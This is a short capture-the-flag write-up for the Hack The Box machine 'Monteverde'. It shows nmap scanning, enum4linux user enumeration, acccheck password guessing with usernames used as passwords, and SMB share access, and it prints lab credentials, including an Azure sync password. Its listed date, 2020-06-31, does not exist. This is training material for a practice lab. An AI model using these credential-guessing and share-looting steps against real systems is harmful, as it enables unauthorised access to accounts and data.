---
title:  "Hack The Box - Monteverde"
date:   2020-06-31
categories: [ctf]
tags: [Windows, writeups, ctf]
---
My write-up / walktrough for the machine `Moneverde` on Hack The Box.

![info](/images/monteverde/info.png)

## nmap
`nmap -sTV -p 1-10000 -Pn -oN nmap_tcp_scan monteverde.htb
`

![nmap](/images/monteverde/nmap.png)

`enum4linux -U monteverde.htb`

![enum4linux](/images/monteverde/enum4linux.png)

` ./acccheck/acccheck.pl -t monteverde.htb -U users.txt -P users.txt `

![acccheck](/images/monteverde/acccheck.png)

SABatchJobs:SABatchJobs

`smbclient \\\\monteverde.htb\\users$ -U SABatchJobs`

![smbmap](/images/monteverde/smbmap.png)

so getting and showing this file, I got `4n0therD4y@n0th3r$`

![azure](/images/monteverde/azure_creds.png)


AAD_987d7f2f57d2:4n0therD4y@n0th3r$